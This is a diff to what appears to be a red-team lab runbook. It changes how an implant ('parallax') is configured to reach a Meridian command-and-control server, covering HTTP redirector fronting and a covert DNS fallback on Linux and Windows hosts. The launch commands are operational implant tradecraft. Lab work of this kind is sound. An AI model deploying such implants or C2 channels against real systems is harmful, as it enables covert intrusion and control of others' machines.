@@ -271,12 +271,20 @@ Verify that all service status cards display **● RUNNING** in green.
 2. **Execute Implant with Dual Transports**:
    On your test VM or target host:
    ```bash
-   # Linux Target:
-   export MERIDIAN_HTTP="http://<C2STACK_IP>:80/gateway/v1/telemetry"
+   # Linux Target (canonical form — base URL + prefix as SEPARATE vars):
+   export MERIDIAN_HTTP="http://<C2STACK_IP>:80"
+   export MERIDIAN_URI_PREFIX="/gateway/v1/telemetry"
    export MERIDIAN_DNS="<C2STACK_IP>:15353"
    export MERIDIAN_DNS_DOMAIN="c2.cadre.local"
    ./parallax-linux-amd64
    ```
+   > ⚠️ **Do NOT put the route path in both vars.** The implant requests
+   > `MERIDIAN_HTTP + MERIDIAN_URI_PREFIX + /api/v1/kex`. Setting
+   > `MERIDIAN_HTTP="http://<IP>:80/gateway/v1/telemetry"` **and**
+   > `MERIDIAN_URI_PREFIX="/gateway/v1/telemetry"` doubles the prefix
+   > (`.../telemetry/gateway/v1/telemetry/api/v1/kex` → backend 404) and the
+   > implant never checks in. Pick ONE form: base+prefix (above), or the full
+   > path in `MERIDIAN_HTTP` with `MERIDIAN_URI_PREFIX` left unset.
 3. **Interact via the Meridian Console**:
    Inside the Meridian container or via Kali CLI:
    ```bash
@@ -469,8 +477,10 @@ On the `ws01` SSH session, launch the implant with both primary HTTP fronting an
 ```cmd
 cd C:\Users\analyst_t1\Downloads
 
-:: Configure HTTP Primary Transport (through the Apache Redirector)
-set MERIDIAN_HTTP=http://192.168.77.1:80/gateway/v1/telemetry
+:: Configure HTTP Primary Transport (through the Apache Redirector).
+:: Base URL and route prefix are SEPARATE vars — see the warning below.
+set MERIDIAN_HTTP=http://192.168.77.1:80
+set MERIDIAN_URI_PREFIX=/gateway/v1/telemetry
 
 :: Configure DNS Secondary Covert Transport
 set MERIDIAN_DNS=192.168.77.1:15353
